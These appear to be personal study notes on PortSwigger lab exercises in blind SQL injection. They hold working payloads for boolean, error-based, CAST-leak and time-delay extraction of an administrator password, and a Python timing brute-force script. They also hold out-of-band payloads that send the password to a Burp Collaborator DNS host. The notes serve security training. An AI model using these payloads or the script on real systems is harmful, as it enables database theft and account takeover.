In this section, we describe techniques for finding and exploiting blind SQL injection vulnerabilities.

## What is blind SQL injection?

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as `UNION` attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.
 
 ---

## Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`

When a request containing a `TrackingId` cookie is processed, the application uses a SQL query to determine whether this is a known user:

`SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized `TrackingId`, the query returns data and you receive a "Welcome back" message in the response.

This behaviour is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.

To understand how this exploit works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

`…xyz' AND '1'='1 
`…xyz' AND '1'='2`

- The first of these values causes the query to return results, because the injected `AND '1'='1` condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

This allows us to determine the answer to any single injected condition, and extract data one piece at a time.

For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

To do this, start with the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`

This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.

Next, we send the following input:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`

This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.

Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:

`xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`

We can continue this process to systematically determine the full password for the `Administrator` user.

#### Note

The `SUBSTRING` function is called `SUBSTR` on some types of database. For more details, see the SQL injection cheat sheet.

---

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

![[Pasted image 20240624064022.png]]

We get the welcome message back with this command but we don't get it with the other. 

```sh
' AND '1'='1
```

```sh
' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

**If greater than "Welcome Back"
If less than "No Message"**

I use the sniper feature to try and speed up the pass cracking

![[Pasted image 20240624065441.png]]

I find the first letter, now we just repeat the process to get the admin password. 

![[Pasted image 20240624065637.png]]

![[Pasted image 20240624071958.png]]

![[Pasted image 20240624072146.png]]

This will take a long time so we should determine the password length, and look for a quicker solution.

I'm not even sure if i have done the right thing above, but it looked like it was working. 

Verify that the condition is true, confirming that there is a table called `users`

```sh
' AND (SELECT 'a' FROM users LIMIT 1)='a
```

![[Pasted image 20240624072514.png]]

Confirm the admin account

```sh
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

![[Pasted image 20240624072754.png]]

Find pass length

```sh
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```

![[Pasted image 20240624073141.png]]

We enumerate the password length and find out we stop getting the Welcome Back message at character 20

![[Pasted image 20240624073352.png]]

I did this manually but Burp has a number payload system that you can use, and you can grep match for the `Welcome back` message.

```sh
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

We already know the first character is `t` which we tested out to make sure the payload is working as intended.

We can use a cluster bomb attack to automate both processes so we don't have to keep changing the password character position.

![[Pasted image 20240624075714.png]]

We set a numbers payload for payload one, and we set a brute forcer from 1-20 on payload two, that way it should brute force both positions for us. 

***Don't forget to set the welcome back message with correct capitalisation***

Burp community is taking a very long time, in the mean time i looked up a python script that will do the same thing but faster, but i'll let community finish just in case the script doesn't work.

This girl is pretty good. 
https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-11/sqli-lab-11.py

So it finally finished. I almost wish i didn't wait for it now. 

![[Pasted image 20240624090806.png]]

Let's try the python script and see if it does it faster. 

I needed to get the firefox extension cookie editor to obtain the cookies and session id easily. I then modified the script and added in the new values, and the script was up and running. 

![[Pasted image 20240624092407.png]]

The script successfully obtained the correct password.

![[Pasted image 20240624092718.png]]

![[Pasted image 20240624092646.png]]

---

## Error-based SQL injection

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts. The possibilities depend on the configuration of the database and the types of errors you're able to trigger:

- You may be able to induce the application to return a specific error response based on the result of a boolean expression. You can exploit this in the same way as the conditional responses we looked at in the previous section. For more information, see Exploiting blind SQL injection by triggering conditional errors.
- You may be able to trigger error messages that output the data returned by the query. This effectively turns otherwise blind SQL injection vulnerabilities into visible ones. For more information, see Extracting sensitive data via verbose SQL error messages.

## Exploiting blind SQL injection by triggering conditional errors

Some applications carry out SQL queries but their behavior doesn't change, regardless of whether the query returns any data. The technique in the previous section won't work, because injecting different boolean conditions makes no difference to the application's responses.

It's often possible to induce the application to return a different response depending on whether a SQL error occurs. You can modify the query so that it causes a database error only if the condition is true. Very often, an unhandled error thrown by the database causes some difference in the application's response, such as an error message. This enables you to infer the truth of the injected condition.

To see how this works, suppose that two requests are sent containing the following `TrackingId` cookie values in turn:

`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`

These inputs use the `CASE` keyword to test a condition and return a different expression depending on whether the expression is true:

- With the first input, the `CASE` expression evaluates to `'a'`, which does not cause any error.
- With the second input, it evaluates to `1/0`, which causes a divide-by-zero error.

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

Using this technique, you can retrieve data by testing one character at a time:

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

#### Note

There are different ways of triggering conditional errors, and different techniques work best on different database types. For more details, see the SQL injection cheat sheet.
 
 Commands:
 
```sh
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
```

```sh
`' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
```

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

Confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error.

```sh
'||(SELECT '')||'
```

In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:

```sh
'||(SELECT '' FROM dual)||'
```

As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all `SELECT` statements to explicitly specify a table name.

Verify that the error disappears. This demonstrates that you can trigger an error conditionally on the truth of a specific condition. The `CASE` statement tests a condition and evaluates to one expression if the condition is true, and another expression if the condition is false. The former expression contains a divide-by-zero, which causes an error. In this case, the two payloads test the conditions `1=1` and `1=2`, and an error is received when the condition is `true`.

```sh
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
```

You can use this behaviour to test whether specific entries exist in a table. For example, use the following query to check whether the username `administrator` exists:

```sh
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

Verify that the condition is true (the error is received), confirming that there is a user called `administrator`.

The next step is to determine how many characters are in the password:

```sh
'||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.

In the Positions tab of Burp Intruder, change the value of the cookie to:

```sh
'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

This uses the `SUBSTR()` function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.

Place payload position markers around the final `a` character in the cookie value. To do this, select just the `a`, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):

```sh
'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload settings" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.

Review the attack results to find the value of the character at the first position. The application returns an HTTP 500 status code when the error occurs, and an HTTP 200 status code normally. The "Status" column in the Intruder results shows the HTTP status code, so you can easily find the row with 500 in this column. The payload showing for that row is the value of the character at the first position.

Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:

```sh
'||(SELECT CASE WHEN SUBSTR(password,2,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

_**We can also use a cluster bomb attack**_ 

I used the python brute forcer again here because it took such a long time with community burp, but i'll try doing a fork bomb attack with zap and see if it's any faster. 

![[Pasted image 20240624110101.png]]

![[Pasted image 20240624114949.png]]

It look's like it's working but the pass doesn't work so i may have done something wrong.
- It had started at zero so i was adding in an extra character. Once i removed that it allowed me to login as admin.

![[Pasted image 20240624115429.png]]

This was much better because it sorted the order and burp couldn't, or wouldn't do that. 

---

## Extracting sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an `id` parameter:

`Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char`

This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a `WHERE` statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.

Occasionally, you may be able to induce the application to generate an error message that contains some of the data that is returned by the query. This effectively turns an otherwise blind SQL injection vulnerability into a visible one.

You can use the `CAST()` function to achieve this. It enables you to convert one data type to another. For example, imagine a query containing the following statement:

`CAST((SELECT example_column FROM example_table) AS int)`

Often, the data that you're trying to read is a string. Attempting to convert this to an incompatible data type, such as an `int`, may cause an error similar to the following:

`ERROR: invalid input syntax for type integer: "Example data"`

This type of query may also be useful if a character limit prevents you from triggering conditional responses.

Commands:

```sh
' AND CAST((SELECT 1) AS int)--
```

```sh
' CAST((SELECT example_column FROM example_table) AS int)
```

```sh
' AND CAST((SELECT 1) AS int)--
```

```sh
' AND 1=CAST((SELECT username FROM users) AS int)--
```

```sh
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

```sh
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

> Solution

1. Using Burp's built-in browser, explore the lab functionality.
2. Go to the **Proxy > HTTP history** tab and find a `GET /` request that contains a `TrackingId` cookie.
3. In Repeater, append a single quote to the value of your `TrackingId` cookie and send the request.
    
    `TrackingId=ogAZZfxtOKUELbuJ'`
    
    ![[Pasted image 20240624120656.png]]
    
1. In the response, notice the verbose error message. This discloses the full SQL query, including the value of your cookie. It also explains that you have an unclosed string literal. Observe that your injection appears inside a single-quoted string.
2. In the request, add comment characters to comment out the rest of the query, including the extra single-quote character that's causing the error:
    
    `TrackingId=ogAZZfxtOKUELbuJ'--`
6. Send the request. Confirm that you no longer receive an error. This suggests that the query is now syntactically valid.
7. Adapt the query to include a generic `SELECT` subquery and cast the returned value to an `int` data type:
    
    `TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--`
    
    ![[Pasted image 20240624121643.png]]
    
1. Send the request. Observe that you now get a different error saying that an `AND` condition must be a boolean expression.
2. Modify the condition accordingly. For example, you can simply add a comparison operator (`=`) as follows:
    
    `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--`
    
1. Send the request. Confirm that you no longer receive an error. This suggests that this is a valid query again.
2. Adapt your generic `SELECT` statement so that it retrieves usernames from the database:
    
    `TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--`
12. Observe that you receive the initial error message again. Notice that your query now appears to be truncated due to a character limit. As a result, the comment characters you added to fix up the query aren't included.
13. Delete the original value of the `TrackingId` cookie to free up some additional characters. Resend the request.
    
    `TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
14. Notice that you receive a new error message, which appears to be generated by the database. This suggests that the query was run properly, but you're still getting an error because it unexpectedly returned more than one row.
15. Modify the query to return only one row:
    
    `TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
    
    ![[Pasted image 20240624122027.png]]
    
1. Send the request. Observe that the error message now leaks the first username from the `users` table:
    
    `ERROR: invalid input syntax for type integer: "administrator"`
17. Now that you know that the `administrator` is the first user in the table, modify the query once again to leak their password:
    
    `TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
18. Log in as `administrator` using the stolen password to solve the lab.

![[Pasted image 20240624122149.png]]

---

## Exploiting blind SQL injection by triggering time delays

If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false. As SQL queries are normally processed synchronously by the application, delaying the execution of a SQL query also delays the HTTP response. This allows you to determine the truth of the injected condition based on the time taken to receive the HTTP response.

The techniques for triggering a time delay are specific to the type of database being used. For example, on Microsoft SQL Server, you can use the following to test a condition and trigger a delay depending on whether the expression is true:

`'; IF (1=2) WAITFOR DELAY '0:0:10'-- 
`'; IF (1=1) WAITFOR DELAY '0:0:10'--`

- The first of these inputs does not trigger a delay, because the condition `1=2` is false.
- The second input triggers a delay of 10 seconds, because the condition `1=1` is true.

Using this technique, we can retrieve data by testing one character at a time:

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

#### Note

There are various ways to trigger time delays within SQL queries, and different techniques apply on different types of database. For more details, see the SQL injection cheat sheet.

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

Commands:

```sh
';IF (1=1) WAITFOR DELAY '0:0:10'--
```

```sh
';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

The `;` has to be url encoded to `%3b` 

```sh
'%3b%SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

![[Pasted image 20240624134139.png]]

We can now use `1=2` to confirm if this is correct because it should provide no delay. 

Now we can start enumerating username:

```sh
'%3b%SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

You may need to url encode the spaces using `+`

Now we Find the pass length:

```sh
'%3b%SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

![[Pasted image 20240624135731.png]]

We now check the pass letters:

```sh
'%3b%SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

Here we are asking for the first position, and to search for just one character, which is what the `password,1,1` means. I can then check to see if that character is an `a` by checking the response time. 

Now we can use one of the methods to brute force the pass:
- Burp Suite cluster bomb
- owasp zap fuzz
- python script

```python
import sys
import requests
import urllib3
import urllib

# Disable certificate warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Allows the script to go through repeater which makes it easier to see what it's requesting in burp suite
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
# Substring function extracts the character, ascii function converts it to ascii, and then it checks to see if it's equal to the j range 32 character, if it is then it sleeps and if not don't sleep
            sql_payload = "' || (select case when (username='administrator' and ascii(substring(password,%s,1))='%s') then pg_sleep(10) else pg_sleep(-1) end from users)--" %(i,j)
            sql_payload_encoded = urllib.parse.quote(sql_payload)
            cookies = {'TrackingId': '4kvqBxnpvcbcGVXk' + sql_payload_encoded, 'session': 'EI9T2L5PowgzjIUPcILvNp7IoJPvjvPN'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds()) > 9:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()


def main():
# Error handling and usage instructions
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("(+) Retreiving administrator password...")
    sqli_password(url) 

if __name__ == "__main__":
    main()
```

![[Pasted image 20240624143937.png]]

For some reason in missed the first character on the first run which was `4`, but it picked it up on the second try.

---

## Exploiting blind SQL injection using out-of-band (OAST) techniques

An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.

The easiest and most reliable tool for using out-of-band techniques is Burp Collaborator. This is a server that provides custom implementations of various network services, including DNS. It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application. Burp Suite Professional includes a built-in client that's configured to work with Burp Collaborator right out of the box. For more information, see the documentation for Burp Collaborator.

The techniques for triggering a DNS query are specific to the type of database being used. For example, the following input on Microsoft SQL Server can be used to cause a DNS lookup on a specified domain:

```sh
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'--
```

This causes the database to perform a lookup for the following domain:

`0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net`

You can use Burp Collaborator to generate a unique subdomain and poll the Collaborator server to confirm when any DNS lookups occur.

Collaborator alternative:
https://github.com/projectdiscovery/interactsh

Dependencies:

```sh
sudo apt install golang-go
```

Install:

```sh
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```



Payload:

```sh
` SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
```

Test:
```sh
` || SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
```

I spent hours on this but all i had to do is use `burpcollaborator.net` as the payload destination. I couldn't get interactsh to work.

---

## Exploiting blind SQL injection using out-of-band (OAST) techniques - Continued

Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application. For example:

```sh
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```

This input reads the password for the `Administrator` user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password:

`S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net`

Out-of-band (OAST) techniques are a powerful way to detect and exploit blind SQL injection, due to the high chance of success and the ability to directly exfiltrate data within the out-of-band channel. For this reason, OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.

#### Note

There are various ways of triggering out-of-band interactions, and different techniques apply on different types of database. For more details, see the SQL injection cheat sheet.


